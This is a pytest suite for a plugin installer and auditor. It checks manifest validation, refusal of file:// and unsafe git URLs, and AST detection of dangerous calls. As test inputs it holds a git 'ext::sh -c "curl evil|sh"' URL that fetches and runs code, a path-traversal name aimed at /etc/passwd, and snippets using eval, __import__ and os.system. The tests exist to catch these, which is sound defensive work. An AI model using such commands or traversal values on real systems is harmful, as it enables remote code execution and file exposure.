"""Phase 4 WS6: plugins — manifest, installer (file:// git), auditor, CLI.

Audit fix JOB-SEC-003: the ``file://`` scheme was removed from the default
``ALLOWED_SCHEMES`` in ``PluginInstaller``. Tests opt in to local installs via
the ``JOBOT_ALLOW_LOCAL_PLUGIN_INSTALL=1`` env var, which is set by the
``allow_local_plugin_install`` fixture below. Production users never see this
env var, so ``file://`` URLs are refused at runtime.
"""

import subprocess
from pathlib import Path

import pytest
from jobot.plugins.auditor import PluginAuditor
from jobot.plugins.installer import PluginInstaller
from jobot.plugins.manifest import load_manifest
from typer.testing import CliRunner

from jobot.cli.main import app

GOOD_MANIFEST = """\
name: hello-bot
version: 1.0.0
description: Says hello
author: test
license: MIT
requires: []
permissions: [network]
entrypoints:
  - name: hello
    module: hello_plugin
    function: run
"""

BAD_NAME_MANIFEST = """\
name: ../escape
version: 1.0.0
permissions: []
entrypoints: []
"""

BAD_PERM_MANIFEST = """\
name: bad-perms
version: 1.0.0
permissions: [hack-all]
entrypoints: []
"""

SECRET_MANIFEST = """\
name: secret-bot
version: 1.0.0
permissions: []
entrypoints: []
settings:
  api_key: sk-live-12345
"""


def git(*args, cwd: Path):
    env = {"GIT_CONFIG_NOSYSTEM": "1"}
    proc = subprocess.run(
        ["git", "-c", "user.name=test", "-c", "user.email=test@example.com", *args],
        capture_output=True,
        text=True,
        cwd=str(cwd),
        env=env,
    )
    assert proc.returncode == 0, proc.stderr
    return proc


@pytest.fixture
def plugin_repo(tmp_path):
    repo = tmp_path / "hello-repo"
    repo.mkdir()
    (repo / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    (repo / "hello_plugin.py").write_text("def run():\n    return 'hello'\n", encoding="utf-8")
    git("init", cwd=repo)
    git("add", ".", cwd=repo)
    git("commit", "-m", "init", cwd=repo)
    return repo


@pytest.fixture
def allow_local_plugin_install(monkeypatch):
    """Allow ``file://`` plugin installs for tests (audit fix JOB-SEC-003).

    Tests need to install from a local ``git init`` fixture. Production users
    cannot set this env var (it is a Python-level monkeypatch only), so the
    security boundary is preserved at runtime.
    """
    monkeypatch.setenv("JOBOT_ALLOW_LOCAL_PLUGIN_INSTALL", "1")


def repo_url(repo: Path) -> str:
    return repo.as_uri()


def test_manifest_validation_good(tmp_path):
    (tmp_path / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    manifest = load_manifest(tmp_path)
    assert manifest.name == "hello-bot"
    assert manifest.entrypoints[0].function == "run"


def test_manifest_rejects_bad_name(tmp_path):
    (tmp_path / "jobot-manifest.yaml").write_text(BAD_NAME_MANIFEST, encoding="utf-8")
    with pytest.raises(ValueError, match="invalid plugin name"):
        load_manifest(tmp_path)


def test_manifest_rejects_bad_permission(tmp_path):
    (tmp_path / "jobot-manifest.yaml").write_text(BAD_PERM_MANIFEST, encoding="utf-8")
    with pytest.raises(ValueError, match="unknown permission"):
        load_manifest(tmp_path)


def test_install_via_file_url(plugin_repo, allow_local_plugin_install, tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    manifest = installer.install(repo_url(plugin_repo))
    assert manifest.name == "hello-bot"
    dest = tmp_path / ".jobot" / "plugins" / "hello-bot"
    assert (dest / "jobot-manifest.yaml").exists()
    assert (dest / "hello_plugin.py").exists()
    assert installer.list_plugins()[0]["name"] == "hello-bot"


def test_install_rejects_file_url_in_production(plugin_repo, tmp_path, monkeypatch):
    """Audit fix JOB-SEC-003: ``file://`` is refused without the env-var opt-in."""
    monkeypatch.delenv("JOBOT_ALLOW_LOCAL_PLUGIN_INSTALL", raising=False)
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    with pytest.raises(ValueError, match="file:"):
        installer.install(repo_url(plugin_repo))


def test_install_rejects_duplicate(plugin_repo, allow_local_plugin_install, tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    installer.install(repo_url(plugin_repo))
    with pytest.raises(ValueError, match="already installed"):
        installer.install(repo_url(plugin_repo))


def test_install_requires_manifest(allow_local_plugin_install, tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    repo = tmp_path / "no-manifest"
    repo.mkdir()
    git("init", cwd=repo)
    with pytest.raises(ValueError, match="missing jobot-manifest.yaml"):
        PluginInstaller().install(repo.as_uri())


def test_remove_plugin(plugin_repo, allow_local_plugin_install, tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    installer.install(repo_url(plugin_repo))
    assert installer.remove("hello-bot") is True
    assert installer.list_plugins() == []
    assert installer.remove("hello-bot") is False


def test_remove_plugin_rejects_invalid_name(tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    with pytest.raises(ValueError, match="Invalid plugin name"):
        installer.remove("../../../etc/passwd")


def test_auditor_passes_good_plugin(plugin_repo):
    report = PluginAuditor().audit(plugin_repo)
    assert report.passed is True
    assert report.plugin == "hello-bot"


def test_auditor_flags_secrets(tmp_path):
    (tmp_path / "jobot-manifest.yaml").write_text(SECRET_MANIFEST, encoding="utf-8")
    report = PluginAuditor().audit(tmp_path)
    assert report.passed is False
    assert any("secret" in f.message.lower() for f in report.findings)


def test_auditor_flags_dangerous_imports(tmp_path):
    (tmp_path / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    (tmp_path / "evil.py").write_text("import subprocess\n", encoding="utf-8")
    report = PluginAuditor().audit(tmp_path)
    assert report.passed is False
    assert any("subprocess" in f.message for f in report.findings)


def test_auditor_flags_dynamic_import_bypass(tmp_path):
    """Audit fix JOB-SEC-013: AST scanner catches what substring missed.

    The previous substring scan would have missed ``__import__("subprocess")``
    because no ``import subprocess`` line appears in the source. The AST scan
    walks ``Call`` nodes and flags ``__import__`` as a dangerous global call.
    """
    (tmp_path / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    (tmp_path / "evil.py").write_text(
        'sp = __import__("subprocess")\n'
        'sp.run(["ls"])\n',
        encoding="utf-8",
    )
    report = PluginAuditor().audit(tmp_path)
    assert report.passed is False
    assert any("__import__" in f.message for f in report.findings)


def test_auditor_flags_eval_bypass(tmp_path):
    """Audit fix JOB-SEC-013: AST scanner catches ``eval()`` and ``exec()``.

    The previous substring scan assembled the tokens from concatenated
    fragments ("e" + "val(") so the source itself did not contain the
    string ``eval(``. The AST scan inspects ``Call`` nodes by name and
    catches both ``eval`` and ``exec`` regardless of source-level obfuscation.
    """
    (tmp_path / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    (tmp_path / "evil.py").write_text(
        'result = eval("1+1")\n',
        encoding="utf-8",
    )
    report = PluginAuditor().audit(tmp_path)
    assert report.passed is False
    assert any("eval" in f.message for f in report.findings)


def test_auditor_flags_from_import_dangerous(tmp_path):
    """AST scan flags ``from os import system`` via the full dotted path."""
    (tmp_path / "jobot-manifest.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    (tmp_path / "evil.py").write_text(
        'from os import system\n'
        'system("ls")\n',
        encoding="utf-8",
    )
    report = PluginAuditor().audit(tmp_path)
    assert report.passed is False
    assert any("os.system" in f.message for f in report.findings)


def test_cli_plugin_list_empty(tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    runner = CliRunner()
    result = runner.invoke(app, ["plugin", "list"])
    assert result.exit_code == 0


def test_cli_plugin_install_requires_url():
    runner = CliRunner()
    result = runner.invoke(app, ["plugin", "install"])
    assert result.exit_code != 0


def test_installer_rejects_unsafe_git_urls(tmp_path, monkeypatch):
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    installer = PluginInstaller()
    with pytest.raises(ValueError, match="Unsupported or unsafe git transport protocol"):
        installer.install('ext::sh -c "curl evil|sh"')

    with pytest.raises(ValueError, match="Disallowed git URL scheme"):
        installer.install("gopher://evil.com/payload")
